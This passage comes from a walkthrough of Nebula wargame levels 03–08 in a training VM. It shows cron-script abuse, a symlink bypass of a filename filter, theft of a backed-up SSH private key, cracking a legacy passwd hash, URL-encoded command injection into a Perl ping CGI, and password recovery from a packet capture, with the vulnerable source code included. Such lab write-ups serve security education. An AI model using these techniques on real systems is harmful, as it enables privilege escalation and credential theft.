<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/home/flag03$ ls
</span><span class='line'>writable.d  writable.sh
</span><span class='line'>level03@nebula:/home/flag03$ cat writable.sh 
</span><span class='line'>#!/bin/sh
</span><span class='line'>
</span><span class='line'>for i in /home/flag03/writable.d/* ; do
</span><span class='line'>  (ulimit -t 5; bash -x "$i")
</span><span class='line'>  rm -f "$i"
</span><span class='line'>done
</span></code></pre></td></tr></table></div></figure>


<p>So the crontab is executing this script that executes every file in the writable.d directory and then removes it. Which means all we have to do is put a file of our own that calles <em>getflag</em> in the directory, and wait for cron to do its job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/home/flag03/writable.d$ cat &gt; exeme.sh 
</span><span class='line'>/bin/getflag &gt; /tmp/readme</span></code></pre></td></tr></table></div></figure>


<p>Now wait a bit and check the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/tmp$ cat readme
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level04</h3>

<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>

<p>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Right, so our goal is to read the token file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/home/flag04$ ls
</span><span class='line'>flag04  token</span></code></pre></td></tr></table></div></figure>


<p>We don&rsquo;t have permission to do so directly. The flag04 executable can read files but it&rsquo;s conveniently coded not to read the token file. However, it&rsquo;s able to read other files just fine, provided we don&rsquo;t run into permission issues. So I went to <em>/tmp</em> and made a symbolic link that points to the token file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/tmp$ ln -s /home/flag04/token /tmp/readthis
</span><span class='line'>level04@nebula:/tmp$ ls -l readthis 
</span><span class='line'>lrwxrwxrwx 1 level04 level04 18 2015-09-04 01:17 readthis -&gt; /home/flag04/token</span></code></pre></td></tr></table></div></figure>


<p>And now I had the flag04 binary read the symlink, and implicitly, the token:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/readthis
</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2</span></code></pre></td></tr></table></div></figure>


<p>I was at a loss at what to do with this string, but since our objective is to run <em>getflag</em>, I tried <code>su flag04</code> and used the token as password and it worked. Then it was all a matter of running <em>getflag</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ /bin/getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level05</h3>

<p>Check the flag05 home directory. You are looking for weak directory permissions</p>

<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>

<p>Taking a look in the flag05 directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05$ ls -la 
</span><span class='line'>total 5
</span><span class='line'>drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
</span><span class='line'>drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
</span><span class='line'>drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
</span><span class='line'>-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
</span><span class='line'>-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
</span><span class='line'>-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
</span><span class='line'>drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh</span></code></pre></td></tr></table></div></figure>


<p>Ok, the <em>.backup</em> folder seems interesting, let&rsquo;s see what&rsquo;s in there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05/.backup$ ls
</span><span class='line'>backup-19072011.tgz
</span><span class='line'>level05@nebula:/home/flag05/.backup$ tar zxvf backup-19072011.tgz 
</span><span class='line'>.ssh/
</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
</span><span class='line'>.ssh/id_rsa.pub
</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
</span><span class='line'>tar: .ssh/id_rsa.pub: Cannot open: No such file or directory
</span><span class='line'>.ssh/id_rsa
</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
</span><span class='line'>tar: .ssh/id_rsa: Cannot open: No such file or directory
</span><span class='line'>.ssh/authorized_keys
</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
</span><span class='line'>tar: .ssh/authorized_keys: Cannot open: No such file or directory
</span><span class='line'>tar: Exiting with failure status due to previous errors</span></code></pre></td></tr></table></div></figure>


<p>Oops! It looks like this is a backup of the <em>.ssh</em> folder but we only have read permissions in this directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/tmp$ ls -l /home/flag05/.backup/
</span><span class='line'>total 2
</span><span class='line'>-rw-rw-r-- 1 flag05 flag05 1826 2011-11-20 20:13 backup-19072011.tgz</span></code></pre></td></tr></table></div></figure>


<p>Not a problem though! We can just move the archive to a directory where we have more freedom:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/
</span><span class='line'>level05@nebula:/tmp$ tar vzxf backup-19072011.tgz 
</span><span class='line'>.ssh/
</span><span class='line'>.ssh/id_rsa.pub
</span><span class='line'>.ssh/id_rsa
</span><span class='line'>.ssh/authorized_keys</span></code></pre></td></tr></table></div></figure>


<p>And now with flag05&rsquo;s private key, we can SSH to the machine and run <em>getflag</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@localhost
</span><span class='line'>  
</span><span class='line'>      _   __     __          __     
</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
</span><span class='line'>                                    
</span><span class='line'>    exploit-exercises.com/nebula
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>For level descriptions, please see the above URL.
</span><span class='line'>
</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
</span><span class='line'>XX is the level number.
</span><span class='line'>
</span><span class='line'>Currently there are 20 levels (00 - 19).
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>New release '12.04 LTS' available.
</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>flag05@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level06</h3>

<p>The flag06 account credentials came from a legacy unix system.</p>

<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>

<p>I looked around a bit, didn&rsquo;t find anything interesting in the files owned by flag06. But keeping the hint in mind, I took a cursory glance at the <code>/etc/passwd</code> file, and bingo!:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ cat /etc/passwd
</span><span class='line'>...
</span><span class='line'>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>The password hash for the flag06 user is inside <em>/etc/passwd</em>! (as a remnant of the old times when this file also contained the passwords for the users). Time to get cracking! I copied the hash to a file and ran John on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# john --show hash
</span><span class='line'>?:hello
</span><span class='line'>
</span><span class='line'>1 password hash cracked, 0 left</span></code></pre></td></tr></table></div></figure>


<p>So the password is <em>hello</em>. Now it&rsquo;s just a matter of ssh&#8217;ing and getting the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ ssh flag06@localhost
</span><span class='line'>The authenticity of host 'localhost (127.0.0.1)' can't be established.
</span><span class='line'>ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
</span><span class='line'>  
</span><span class='line'>      _   __     __          __     
</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
</span><span class='line'>                                    
</span><span class='line'>    exploit-exercises.com/nebula
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>For level descriptions, please see the above URL.
</span><span class='line'>
</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
</span><span class='line'>XX is the level number.
</span><span class='line'>
</span><span class='line'>Currently there are 20 levels (00 - 19).
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag06@localhost's password: 
</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>New release '12.04 LTS' available.
</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>flag06@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level 07</h3>

<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>

<p>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;$line&quot;</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># check if Host set. if not, display normal page, etc</span>
</span><span class='line'>
</span><span class='line'><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>Start by looking inside the <em>thttpd.conf</em> for some options and information about how the server is set up (thttpd is a HTTP server designed for simplicity, speed and portability). I only kept the lines that interested me in the output below:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'># Specifies an alternate port number to listen on.
</span><span class='line'>port=7007
</span><span class='line'>
</span><span class='line'># Specifies what user to switch to after initialization when started as root.
</span><span class='line'>user=flag07
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>So the web server runs as the flag07 user. I pointed my browser to <a href="http://192.168.80.133:7007/index.cgi">http://192.168.80.133:7007/index.cgi</a> and saw some usage output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
</span><span class='line'>            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
</span><span class='line'>            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
</span><span class='line'>            [-T tstamp-options] [-Q tos] [hop1 ...] destination</span></code></pre></td></tr></table></div></figure>


<p>Looking in the source code, the program needs a Host parameter, otherwise it will display this usage information. I tested it by changing the URL to <a href="http://192.168.80.133:7007/index.cgi?Host=localhost">http://192.168.80.133:7007/index.cgi?Host=localhost</a> and the ping was run successfully:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING localhost (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.025 ms
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.028 ms
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.034 ms
</span><span class='line'>
</span><span class='line'>--- localhost ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1999ms
</span><span class='line'>rtt min/avg/max/mdev = 0.025/0.029/0.034/0.003 ms</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s now a matter of injecting the command we want this program to run. I first tried <a href="http://192.168.80.133:7007/index.cgi?Host=localhost;getflag">http://192.168.80.133:7007/index.cgi?Host=localhost;getflag</a> to stack another command after the ping, but it didn&rsquo;t work. I had to URL encode the ; for it to work: <a href="http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag">http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING localhost (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.017 ms
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.036 ms
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.045 ms
</span><span class='line'>
</span><span class='line'>--- localhost ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1998ms
</span><span class='line'>rtt min/avg/max/mdev = 0.017/0.032/0.045/0.013 ms
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level 08</h3>

<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>

<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>

<p>There is a capture.pcap file lying around for our convenience. I transfered it to my machine so I can look at it in Wireshark. Followed TCP Stream and saw a potential password:</p>

<p><img class="center" src="http://chousensha.github.io/images/nebula/level8.png" title="level8" alt="level8"></p>

<p>So the user tried to log in to something called wwwbugs, which I assumed it&rsquo;s irrelevant to the challenge. I tried SSH&#8217;ing as flag08 with the password of <em>backdoor&hellip;00Rm8.ate</em>, but of course it didn&rsquo;t work. Next I tried removing the dots and keeping only the letters and numbers but that didn&rsquo;t work either. But I was fairly sure the password must be related to this string. When looking at the stream in hex, I thought there must be a pattern for those dots:</p>

<p><img class="center" src="http://chousensha.github.io/images/nebula/level8hex.png" title="level8hex" alt="level8hex"></p>

<p>The hex for all the dots in the string is <em>7f</em>, but when looking at the Ascii table, hex encoding for dots is <em>2e</em>. So these aren&rsquo;t really dots! At the very end of the Ascii table I saw that <em>7f</em> actually represents the DEL key. So these dots are placeholders for when the DEL key was pressed. The user must have had trouble remembering his password or something. With this discovery in mind, it&rsquo;s possible to reconstruct the valid password:</p>

<ul>
<li><p>backdoor&hellip;00Rm8.ate &ndash;> backdoor + DELETE 3 times = backd</p></li>
<li><p>00Rm8.ate + DELETE 1 time = 00Rmate</p></li>
</ul>


<p>So the password is  <code>backd00Rmate</code>. At least now it looks more like a password. Tried to SSH as flag08 now with this password and it worked!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
